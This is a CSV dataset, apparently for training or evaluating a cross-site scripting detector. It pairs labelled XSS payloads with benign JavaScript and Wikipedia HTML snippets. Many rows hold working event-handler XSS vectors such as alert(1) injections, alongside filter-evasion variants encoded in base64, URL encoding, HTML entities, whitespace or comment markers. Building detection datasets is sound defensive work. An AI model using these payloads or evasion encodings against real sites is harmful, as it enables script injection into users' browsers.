sample_id,label,payload_original,payload_obfuscated,generator,recipe
680,1,"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>","<div draggable=""true"" contenteditable>drag me<  /div><article ondragover=alert(1) contenteditable>drop here</  article> ",tool_baseline,whitespace_noise
681,0,"$card.data( 'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow')","$card.data( 'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow')",tool_baseline,none
682,0,"stepafter: { startvalue: this.xval[j-0], step: this.xnumsteps[j-0], higheststep: this.xhighestcompletestep[j-0] } }; };","stepafter: { startvalue: this.xval[j-0], step: this.xnumsteps[j-0], higheststep: this.xhighestcompletestep[j-0] } }; };",tool_baseline,none
683,1,<span onpointerup=alert(1)>xss</span>,%3Cspan%20onpointerup%3Dalert%281%29%3Exss%3C%2Fspan%3E,tool_baseline,urlencode
684,0,"this._setattributeifnotexists(outerelem, 'role', 'presentation') } if (!isactive) {","this._setattributeifnotexists(outerelem, 'role', 'presentation') } if (!isactive) {",tool_baseline,none
685,1,<tr id=x tabindex=1 onfocus=alert(1)></tr>,<tr id=x tabindex/*OBF*/=1 onfocus=alert(1)></tr>,tool_baseline,comment_marker
686,0,} else if ($target.closest('.month-prev').length) { this.prevmonth(); } else if ($target.closest('.month-next').length) {,} else if ($target.closest('.month-prev').length) { this.prevmonth(); } else if ($target.closest('.month-next').length) {,tool_baseline,none
687,0,"_classcallcheck(this, carousel); var _this62 = _possibleconstructorreturn(this, (carousel.__proto__ || object.getprototypeof(carousel)).call(this, carousel, el, options)); _this62.el.m_carousel = _this62;","_classcallcheck(this, carousel); var _this62 = _possibleconstructorreturn(this, (carousel.__proto__ || object.getprototypeof(carousel)).call(this, carousel, el, options)); _this62.el.m_carousel = _this62;",tool_baseline,none
688,0,}); } $collapsibleli[0].classlist.add('active');,}); } $collapsibleli[0].classlist.add('active');,tool_baseline,none
689,0,"target.classlist.add(class_name_active) this._activateparents(target) eventhandler.trigger(this._element, event_activate, { relatedtarget: target })","target.classlist.add(class_name_active) this._activateparents(target) eventhandler.trigger(this._element, event_activate, { relatedtarget: target })",tool_baseline,none
690,1,"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationstart=""alert(1)""></dir>","<style>@keyframes x{}</ style><dir style= ""animation-name:x"" onanimationstart=""alert(1)""><  /dir>",tool_baseline,whitespace_noise
691,0,do { prefix += math.floor(math.random() * max_uid) } while (document.getelementbyid(prefix)),do { prefix += math.floor(math.random() * max_uid) } while (document.getelementbyid(prefix)),tool_baseline,none
692,0,"<li><a href=""/wiki/very_large_scale_integration"" title=""very large scale integration"">very large scale integration </a> </li>","<li><a href=""/wiki/very_large_scale_integration"" title=""very large scale integration"">very large scale integration </a> </li>",tool_baseline,none
693,1,"<footer onmousedown=""alert(1)"">test</footer>","<footer onmousedown=""alert(1)""  >test</footer>",tool_baseline,whitespace_noise
694,1,"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>","<tbody onkeydown="" alert(1)"" contenteditable>  test</tbody>",tool_baseline,whitespace_noise
695,1,"<br onkeyup=""alert(1)"" contenteditable>test</br>",&lt;br onkeyup=&quot;alert(1)&quot; contenteditable&gt;test&lt;/br&gt;,tool_baseline,html_entities
696,0,"<p>ai has developed many tools to solve the most difficult problems in <a href=""/wiki/computer_science"" title=""computer science"">computer science </a>. a few of the most general of these methods are discussed below.","<p>ai has developed many tools to solve the most difficult problems in <a href=""/wiki/computer_science"" title=""computer science"">computer science </a>. a few of the most general of these methods are discussed below.",tool_baseline,none
697,0,offset } = this._config; if (typeof offset === 'string') {,offset } = this._config; if (typeof offset === 'string') {,tool_baseline,none
698,1,"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",PGlzaW5kZXggZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdlbnRlcj0iYWxlcnQoMSkiPnRlc3Q8L2lzaW5kZXg+,tool_baseline,base64
699,0,const elements = selectorengine.focusablechildren(trapelement) if (elements.length === 0) { trapelement.focus(),const elements = selectorengine.focusablechildren(trapelement) if (elements.length === 0) { trapelement.focus(),tool_baseline,none
700,0,return template; } _typecheckconfig(config) {,return template; } _typecheckconfig(config) {,tool_baseline,none
701,0,".find('li') .removeclass('selected'); $(optionel).toggleclass('selected', selected);",".find('li') .removeclass('selected'); $(optionel).toggleclass('selected', selected);",tool_baseline,none
702,0,return } element.classlist.add(class_name_active),return } element.classlist.add(class_name_active),tool_baseline,none
703,0,scalefactor = windowwidth / backdrop[0].clientwidth; this.btnbottom = btnrect.bottom; this.btnleft = btnrect.left;,scalefactor = windowwidth / backdrop[0].clientwidth; this.btnbottom = btnrect.bottom; this.btnleft = btnrect.left;,tool_baseline,none
704,0,import eventhandler from '../dom/event-handler.js' import selectorengine from '../dom/selector-engine.js' import config from './config.js',import eventhandler from '../dom/event-handler.js' import selectorengine from '../dom/selector-engine.js' import config from './config.js',tool_baseline,none
705,1,<th onpointerleave=alert(1)>xss</th>,PHRoIG9ucG9pbnRlcmxlYXZlPWFsZXJ0KDEpPnhzczwvdGg+,tool_baseline,base64
706,1,"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",PHN0eWxlPjp0YXJnZXQge2NvbG9yOiByZWQ7fTwvc3R5bGU+PGVtIGlkPXggc3R5bGU9InRyYW5zaXRpb246Y29sb3IgMTBzIiBvbnRyYW5zaXRpb25jYW5jZWw9YWxlcnQoMSk+PC9lbT4=,tool_baseline,base64
707,1,<data onpointerleave=alert(1)>xss</data>,%3Cdata%20onpointerleave%3Dalert%281%29%3Exss%3C%2Fdata%3E,tool_baseline,urlencode
708,0,const callable = isdelegated ? delegationfunction : handler || delegationfunction; let typeevent = gettypeevent(originaltypeevent); if (!nativeevents.has(typeevent)) {,const callable = isdelegated ? delegationfunction : handler || delegationfunction; let typeevent = gettypeevent(originaltypeevent); if (!nativeevents.has(typeevent)) {,tool_baseline,none
709,0,animoptions.translatex = -100; } anim(animoptions);,animoptions.translatex = -100; } anim(animoptions);,tool_baseline,none
710,0,this.originalwidth = this.el.getboundingclientrect().width,this.originalwidth = this.el.getboundingclientrect().width,tool_baseline,none
711,1,"<td onkeypress=""alert(1)"" contenteditable>test</td>",%3Ctd%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Ftd%3E,tool_baseline,urlencode
712,0,var resultdiv = $('<a href=' + result[1] + '>' + result[0] + '</a>'); resultscontainer.append(resultdiv); });,var resultdiv = $('<a href=' + result[1] + '>' + result[0] + '</a>'); resultscontainer.append(resultdiv); });,tool_baseline,none
713,1,"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",PGFjcm9ueW0gb25jdXQ9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvYWNyb255bT4=,tool_baseline,base64
714,0,m.timepicker = timepicker,m.timepicker = timepicker,tool_baseline,none
715,0,calendar.month += 12,calendar.month += 12,tool_baseline,none
716,1,<img src=validimage.png onloadend=alert(1)>,PGltZyBzcmM9dmFsaWRpbWFnZS5wbmcgb25sb2FkZW5kPWFsZXJ0KDEpPg==,tool_baseline,base64
717,1,"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></cite>","<style>@keyframes slidein {}</  style><cite style=""animation-duration:1s;  animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""> </cite>",tool_baseline,whitespace_noise
718,0,}); if (this.showindicators) { this.$el.append(this.$indicators);,}); if (this.showindicators) { this.$el.append(this.$indicators);,tool_baseline,none
719,1,<shadow onpointerenter=alert(1)>xss</shadow>,<shadow onpointerenter=  alert(1)>xss</  shadow>  ,tool_baseline,whitespace_noise
720,1,"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></details>",%3Cstyle%3E%3Atarget%20%7Bcolor%3A%20red%3B%7D%3C%2Fstyle%3E%3Cdetails%20id%3Dx%20style%3D%22transition%3Acolor%2010s%22%20ontransitioncancel%3Dalert%281%29%3E%3C%2Fdetails%3E,tool_baseline,urlencode
721,0,"_classcallcheck(this, taptarget)","_classcallcheck(this, taptarget)",tool_baseline,none
722,1,"<data onmouseenter=""alert(1)"">test</data>","<  data onmouseenter=""alert(1)  "">test</data>  ",tool_baseline,whitespace_noise
723,0,this._deltax = 0 this._supportpointerevents = boolean(window.pointerevent) this._initevents(),this._deltax = 0 this._supportpointerevents = boolean(window.pointerevent) this._initevents(),tool_baseline,none
724,1,"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",%3Cstyle%20draggable%3D%22true%22%20ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fstyle%3E,tool_baseline,urlencode
725,0,} } return elementisvisible;,} } return elementisvisible;,tool_baseline,none
726,1,<nav onpointerenter=alert(1)>xss</nav>,%3Cnav%20onpointerenter%3Dalert%281%29%3Exss%3C%2Fnav%3E,tool_baseline,urlencode
727,1,"<iframe onmouseup=""alert(1)"">test</iframe>",&lt;iframe onmouseup=&quot;alert(1)&quot;&gt;test&lt;/iframe&gt;,tool_baseline,html_entities
728,0,_this35._handlewindowscroll(); return _this35; },_this35._handlewindowscroll(); return _this35; },tool_baseline,none
729,0,}; }; spectrum.prototype.countstepdecimals = function () {,}; }; spectrum.prototype.countstepdecimals = function () {,tool_baseline,none
730,1,"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;tfoot ondrop=alert(1) contenteditable&gt;drop here&lt;/tfoot&gt;,tool_baseline,html_entities
731,1,<svg><discard onbegin=alert(1)>,<svg><discard onbegin=alert(1)>,tool_baseline,comment_marker
732,0,return new focustrap({ trapelement: this._element }),return new focustrap({ trapelement: this._element }),tool_baseline,none
733,0,this.tabswidth = this.$el.width(),this.tabswidth = this.$el.width(),tool_baseline,none
734,1,"<bgsound draggable=""true"" ondragend=""alert(1)"">test</bgsound>",PGJnc291bmQgZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdlbmQ9ImFsZXJ0KDEpIj50ZXN0PC9iZ3NvdW5kPg==,tool_baseline,base64
735,1,"<a href=""http://66.102.7.147/""></a>",PGEgaHJlZj0iaHR0cDovLzY2LjEwMi43LjE0Ny8iPjwvYT4=,tool_baseline,base64
736,1,"<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>","<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>",tool_baseline,whitespace_noise
737,0,const event_pointerup = `pointerup${event_key$9}`; const pointer_type_touch = 'touch'; const pointer_type_pen = 'pen';,const event_pointerup = `pointerup${event_key$9}`; const pointer_type_touch = 'touch'; const pointer_type_pen = 'pen';,tool_baseline,none
738,0,const selector_nav_items = '.nav-item',const selector_nav_items = '.nav-item',tool_baseline,none
739,0,const event_keydown_data_api = `keydown${event_key$6}${data_api_key$3}`,const event_keydown_data_api = `keydown${event_key$6}${data_api_key$3}`,tool_baseline,none
740,1,"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>","<style>  :target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert( 1)></ mark>",tool_baseline,whitespace_noise
741,0,} domcontentloadedcallbacks.push(callback); } else {,} domcontentloadedcallbacks.push(callback); } else {,tool_baseline,none
742,1,"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationstart=""alert(1)""></details>","<style>@keyframes x{}</style><details s/*OBF*/tyl/*OBF*/e=""ani/*OBF*/mation-name:x"" onanimationstart=""alert(1)""></details>",tool_baseline,comment_marker
743,0,this.yeartextel = this.modalel.queryselector('.year-text'),this.yeartextel = this.modalel.queryselector('.year-text'),tool_baseline,none
744,0,"</span> <span class=""reference-text""><a href=""#citerefnorvig2012"">norvig 2012 </a>.","</span> <span class=""reference-text""><a href=""#citerefnorvig2012"">norvig 2012 </a>.",tool_baseline,none
745,1,"<center ondblclick=""alert(1)"">test</center>","<center ondblclick=""alert(1) "">test</center>",tool_baseline,whitespace_noise
746,1,"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationend=""alert(1)""></meter>","<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationend=""ale/*OBF*/rt(1)""></meter/*OBF*/>",tool_baseline,comment_marker
747,0,if (_this18.attrheight) {,if (_this18.attrheight) {,tool_baseline,none
748,1,"<textarea onmouseleave=""alert(1)"">test</textarea>",%3Ctextarea%20onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Ftextarea%3E,tool_baseline,urlencode
749,1,"<font onkeyup=""alert(1)"" contenteditable>test</font>","<font onkeyup=""alert(  1)"" contenteditable>test</font>",tool_baseline,whitespace_noise
750,1,"<font onmousemove=""alert(1)"">test</font>",PGZvbnQgb25tb3VzZW1vdmU9ImFsZXJ0KDEpIj50ZXN0PC9mb250Pg==,tool_baseline,base64
751,0,"<div id=""p-logo"" role=""banner"">","<div id=""p-logo"" role=""banner"">",tool_baseline,none
752,0,const relatedtarget = {,const relatedtarget = {,tool_baseline,none
753,1,"<style>@keyframes x{}</style><rp style=""animation-name:x"" onanimationstart=""alert(1)""></rp>","<style>@keyframes x{}</style><rp sty/*OBF*/le=""animation-name:x"" onanimationstart=""a/*OBF*/lert(1)""></rp>",tool_baseline,comment_marker
754,0,dist: { files: { 'dist/js/materialize.min.js': ['dist/js/materialize.js'],dist: { files: { 'dist/js/materialize.min.js': ['dist/js/materialize.js'],tool_baseline,none
755,1,"<img onmouseenter=""alert(1)"">test</img>",&lt;img onmouseenter=&quot;alert(1)&quot;&gt;test&lt;/img&gt;,tool_baseline,html_entities
756,0,multi-agent planning and emergent behavior:,multi-agent planning and emergent behavior:,tool_baseline,none
757,0,this._calculatepositioning(); this._setupeventhandlers(); },this._calculatepositioning(); this._setupeventhandlers(); },tool_baseline,none
758,0,parsed.tooltips.push(true),parsed.tooltips.push(true),tool_baseline,none
759,0,if (opts.isdisabled) { arr.push('is-disabled'); },if (opts.isdisabled) { arr.push('is-disabled'); },tool_baseline,none
760,0,for (const carousel of carousels) {,for (const carousel of carousels) {,tool_baseline,none
761,0,"m.updatetextfields(); }); $(document).on('reset', function(e) {","m.updatetextfields(); }); $(document).on('reset', function(e) {",tool_baseline,none
762,0,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18.2 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18.2 </li> </ul>",tool_baseline,none
763,0,}; m.getoverflowparent = function (element) { if (element == null) {,}; m.getoverflowparent = function (element) { if (element == null) {,tool_baseline,none
764,1,<bgsound onpointerleave=alert(1)>xss</bgsound>,<  bgsound onpointerleave=alert(1)>xss< /bgsound>,tool_baseline,whitespace_noise
765,0,$activelis.each(function (el) { var index = $collapsiblelis.index($(el)); _this8.close(index);,$activelis.each(function (el) { var index = $collapsiblelis.index($(el)); _this8.close(index);,tool_baseline,none
766,0,"key: ""_renderchips"", value: function _renderchips() { this.$chips.remove();","key: ""_renderchips"", value: function _renderchips() { this.$chips.remove();",tool_baseline,none
767,1,"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PGJkbyBvbmRyYWdvdmVyPWFsZXJ0KDEpIGNvbnRlbnRlZGl0YWJsZT5kcm9wIGhlcmU8L2Jkbz4=,tool_baseline,base64
768,0,"} subclass.prototype = object.create(superclass && superclass.prototype, { constructor: { value: subclass, enumerable: false, writable: true, configurable: true } })","} subclass.prototype = object.create(superclass && superclass.prototype, { constructor: { value: subclass, enumerable: false, writable: true, configurable: true } })",tool_baseline,none
769,0,this.isopen = false; this.modal.close(); },this.isopen = false; this.modal.close(); },tool_baseline,none
770,0,"<li id=""cite_note-305""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-305"">^ </a> </b>","<li id=""cite_note-305""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-305"">^ </a> </b>",tool_baseline,none
771,0,} to = options.format.from(to); if ( to !== false && !isnan(to) ) {,} to = options.format.from(to); if ( to !== false && !isnan(to) ) {,tool_baseline,none
772,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>","<style> @keyframes x{from {left:0; }to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=  x style=""position:absolute;"" onanimationcancel=""alert(1)""> </figcaption>  ",tool_baseline,whitespace_noise
773,1,"<script oncopy=""alert(1)"" contenteditable>test</script>","<script oncopy=""alert(1) "" contenteditable>test</script>  ",tool_baseline,whitespace_noise
774,1,"<big ondblclick=""alert(1)"">test</big>",%3Cbig%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fbig%3E,tool_baseline,urlencode
775,0,} _isanimated() { return this._config.animation || (this.tip && this.tip.classlist.contains(class_name_fade)),} _isanimated() { return this._config.animation || (this.tip && this.tip.classlist.contains(class_name_fade)),tool_baseline,none
776,0,"let registry = { autocomplete: root.queryselectorall('.autocomplete:not(.no-autoinit)'), carousel: root.queryselectorall('.carousel:not(.no-autoinit)'),","let registry = { autocomplete: root.queryselectorall('.autocomplete:not(.no-autoinit)'), carousel: root.queryselectorall('.carousel:not(.no-autoinit)'),",tool_baseline,none
777,0,"<li id=""cite_note-377""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-377"">^ </a> </b>","<li id=""cite_note-377""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-377"">^ </a> </b>",tool_baseline,none
778,1,<time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>,<time id=x tabindex=1 onbe/*OBF*/foredeactivate=alert(1)></tim/*OBF*/e><input autofocus>,tool_baseline,comment_marker
779,0,"instance[methodoroptions].apply(instance, params)","instance[methodoroptions].apply(instance, params)",tool_baseline,none
780,1,"<tt draggable=""true"" ondragenter=""alert(1)"">test</tt>",PHR0IGRyYWdnYWJsZT0idHJ1ZSIgb25kcmFnZW50ZXI9ImFsZXJ0KDEpIj50ZXN0PC90dD4=,tool_baseline,base64
781,1,"<style>:target {color:red;}</style><noscript id=x style=""transition:color 1s"" ontransitionend=alert(1)></noscript>","<style>:target {color:red;}</ style>  <noscript id=x style=""transition:color 1s"" ontransitionend= alert(1)></noscript>",tool_baseline,whitespace_noise
782,0,"if (p.get || p.set) throw new typeerror(""es3 does not support getters and setters."");e != array.prototype && e != object.prototype && (e[r] = p.value); };$jscomp.getglobal = function (e) { return ""undefined"" != typeof window && window === e ? e : ""undefined"" != typeof global && null != global ? global : e;","if (p.get || p.set) throw new typeerror(""es3 does not support getters and setters."");e != array.prototype && e != object.prototype && (e[r] = p.value); };$jscomp.getglobal = function (e) { return ""undefined"" != typeof window && window === e ? e : ""undefined"" != typeof global && null != global ? global : e;",tool_baseline,none
783,0,this._focustrap.deactivate(),this._focustrap.deactivate(),tool_baseline,none
784,1,"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationstart=""alert(1)""></img>",%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cimg%20style%3D%22animation-name%3Ax%22%20onanimationstart%3D%22alert%281%29%22%3E%3C%2Fimg%3E,tool_baseline,urlencode
785,0,return (value === undefined ? this[0][name] : this.each(function (v) { v[name] = value; }));,return (value === undefined ? this[0][name] : this.each(function (v) { v[name] = value; }));,tool_baseline,none
786,0,"</p><p>worldwide annual military spending on robotics rose from us$5.1 billion in 2010 to us$7.5 billion in 2015.<sup id=""cite_ref-332"" class=""reference""><a href=""#cite_note-332"">&#91;321&#93; </a> </sup><sup id=""cite_ref-333"" class=""reference""><a href=""#cite_note-333"">&#91;322&#93; </a> </sup> military drones capable of autonomous action are widely considered a useful asset.<sup id=""cite_ref-334"" class=""reference""><a href=""#cite_note-334"">&#91;323&#93; </a> </sup> many artificial intelligence researchers seek to distance themselves from military applications of ai.<sup id=""cite_ref-335"" class=""reference""><a href=""#cite_note-335"">&#91;324&#93; </a> </sup>","</p><p>worldwide annual military spending on robotics rose from us$5.1 billion in 2010 to us$7.5 billion in 2015.<sup id=""cite_ref-332"" class=""reference""><a href=""#cite_note-332"">&#91;321&#93; </a> </sup><sup id=""cite_ref-333"" class=""reference""><a href=""#cite_note-333"">&#91;322&#93; </a> </sup> military drones capable of autonomous action are widely considered a useful asset.<sup id=""cite_ref-334"" class=""reference""><a href=""#cite_note-334"">&#91;323&#93; </a> </sup> many artificial intelligence researchers seek to distance themselves from military applications of ai.<sup id=""cite_ref-335"" class=""reference""><a href=""#cite_note-335"">&#91;324&#93; </a> </sup>",tool_baseline,none
787,0,const name$5 = 'templatefactory',const name$5 = 'templatefactory',tool_baseline,none
788,1,"<option onmousedown=""alert(1)"">test</option>","<option onmousedo/*OBF*/wn=""alert(1)"">test</option>",tool_baseline,comment_marker
789,0,const documentwidth = document.documentelement.clientwidth return math.abs(window.innerwidth - documentwidth) },const documentwidth = document.documentelement.clientwidth return math.abs(window.innerwidth - documentwidth) },tool_baseline,none
790,0,"top: clippingclientrect.top - elementclientrect.top + paddingobject.top,","top: clippingclientrect.top - elementclientrect.top + paddingobject.top,",tool_baseline,none
791,0,"scrollspy._visibleelements.splice(scrollspy._visibleelements.indexof(this.$el), 1); scrollspy._count--; this._removeeventhandlers();","scrollspy._visibleelements.splice(scrollspy._visibleelements.indexof(this.$el), 1); scrollspy._count--; this._removeeventhandlers();",tool_baseline,none
792,1,"<caption onbeforepaste=""alert(1)"" contenteditable>test</caption>","<caption onbeforepaste=""alert(1)""   contenteditable>test</caption>",tool_baseline,whitespace_noise
793,1,"<base onmouseleave=""alert(1)"">test</base>",&lt;base onmouseleave=&quot;alert(1)&quot;&gt;test&lt;/base&gt;,tool_baseline,html_entities
794,0,var istop = origintop <= centery,var istop = origintop <= centery,tool_baseline,none
795,0,if (q >= g.currenttime) for (var g = 0; g < v; g++) { u[g].seek(q); } else for (; v--;) {,if (q >= g.currenttime) for (var g = 0; g < v; g++) { u[g].seek(q); } else for (; v--;) {,tool_baseline,none
796,0,"'</div>', '<div class=""timepicker-analog-display"">', '<div class=""timepicker-plate"">',","'</div>', '<div class=""timepicker-analog-display"">', '<div class=""timepicker-plate"">',",tool_baseline,none
797,1,"<body onkeypress=""alert(1)"" contenteditable>test</body>",%3Cbody%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fbody%3E,tool_baseline,urlencode
798,1,<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,%3Cstyle%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dalert%281%29%3E%3C%2Fstyle%3E,tool_baseline,urlencode
799,0,"this._updateitemstyle(el, tweenedopacity, -i, _transformstring); } if (this.options.fullwidth) {","this._updateitemstyle(el, tweenedopacity, -i, _transformstring); } if (this.options.fullwidth) {",tool_baseline,none
800,1,"<nobr ondblclick=""alert(1)"">test</nobr>","<nobr ondblclick="" alert(1)"">  test</nobr>",tool_baseline,whitespace_noise
801,0,"<li id=""cite_note-308""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-308"">^ </a> </b>","<li id=""cite_note-308""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-308"">^ </a> </b>",tool_baseline,none
802,0,.tolowercase() .indexof(string) === 0 );,.tolowercase() .indexof(string) === 0 );,tool_baseline,none
803,0,}; waves.attach = function(element) { if (element.tagname.tolowercase() === 'input') {,}; waves.attach = function(element) { if (element.tagname.tolowercase() === 'input') {,tool_baseline,none
804,1,<form onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></form>,<form onscrollsnapchange=alert(1) style=overflow-y:hidden; scroll-snap-type:x> < div style=scroll-snap-align:center>1337</div></form>,tool_baseline,whitespace_noise
805,0,} if (makefallbackchecks) { var numberofchecks = flipvariations ? 3 : 1;,} if (makefallbackchecks) { var numberofchecks = flipvariations ? 3 : 1;,tool_baseline,none
806,1,"<textarea onmouseout=""alert(1)"">test</textarea>","<  textarea onmouseout= ""alert(1)"">test</textarea>",tool_baseline,whitespace_noise
807,1,<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>,PG1hcnF1ZWUgaWQ9eCB0YWJpbmRleD0xIG9uYmVmb3JlZGVhY3RpdmF0ZT1hbGVydCgxKT48L21hcnF1ZWU+PGlucHV0IGF1dG9mb2N1cz4=,tool_baseline,base64
808,1,"<ins draggable=""true"" ondragleave=""alert(1)"">test</ins>","<ins d/*OBF*/raggable=""true"" ondragleave=""alert(1)"">test</ins>",tool_baseline,comment_marker
809,0,var y = (clientrect.top + (addvisualoffsets && visualviewport ? visualviewport.offsettop : 0)) / scaley,var y = (clientrect.top + (addvisualoffsets && visualviewport ? visualviewport.offsettop : 0)) / scaley,tool_baseline,none
810,0,"targets: this.el, translatex: [`${slideoutpercent * 100}%`, 0], duration: this.options.induration,","targets: this.el, translatex: [`${slideoutpercent * 100}%`, 0], duration: this.options.induration,",tool_baseline,none
811,0,const event_load_data_api$3 = `load${event_key$8}${data_api_key$5}`; const event_click_data_api$5 = `click${event_key$8}${data_api_key$5}`; const class_name_carousel = 'carousel';,const event_load_data_api$3 = `load${event_key$8}${data_api_key$5}`; const event_click_data_api$5 = `click${event_key$8}${data_api_key$5}`; const class_name_carousel = 'carousel';,tool_baseline,none
812,0,} _handleinputblur() { if (!this._mousedown) {,} _handleinputblur() { if (!this._mousedown) {,tool_baseline,none
813,0,} } _handletriggerclick(e) {,} } _handletriggerclick(e) {,tool_baseline,none
814,1,"<spacer oncut=""alert(1)"" contenteditable>test</spacer>",&lt;spacer oncut=&quot;alert(1)&quot; contenteditable&gt;test&lt;/spacer&gt;,tool_baseline,html_entities
815,0,const class_name_prev = 'carousel-item-prev',const class_name_prev = 'carousel-item-prev',tool_baseline,none
816,0,if (!document.documentelement.attachshadow) {,if (!document.documentelement.attachshadow) {,tool_baseline,none
817,0,"value: function _setupeventhandlers() { this._handleimageloadbound = this._handleimageload.bind(this); this.$img[0].addeventlistener('load', this._handleimageloadbound);","value: function _setupeventhandlers() { this._handleimageloadbound = this._handleimageload.bind(this); this.$img[0].addeventlistener('load', this._handleimageloadbound);",tool_baseline,none
818,0,"relativex = (e.touches[0].pagex - pos.left); } ripple.setattribute('data-hold', date.now());","relativex = (e.touches[0].pagex - pos.left); } ripple.setattribute('data-hold', date.now());",tool_baseline,none
819,1,"<col oncontextmenu=""alert(1)"">test</col>",PGNvbCBvbmNvbnRleHRtZW51PSJhbGVydCgxKSI+dGVzdDwvY29sPg==,tool_baseline,base64
820,1,<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>,<tfoot id=x tabindex=1 ondeactivate= alert(1)> </tfoot><input id=y autofocus>,tool_baseline,whitespace_noise
821,0,if (this._ishovered === false) { this._leave() },if (this._ishovered === false) { this._leave() },tool_baseline,none
822,1,"<font onmouseout=""alert(1)"">test</font>",&lt;font onmouseout=&quot;alert(1)&quot;&gt;test&lt;/font&gt;,tool_baseline,html_entities
823,1,"<html onmouseout=""alert(1)"">test</html>",&lt;html onmouseout=&quot;alert(1)&quot;&gt;test&lt;/html&gt;,tool_baseline,html_entities
824,1,"<hgroup onbeforecut=""alert(1)"" contenteditable>test</hgroup>","<hgroup onbeforecut=  ""alert(1)"" contenteditable>test</hgroup>",tool_baseline,whitespace_noise
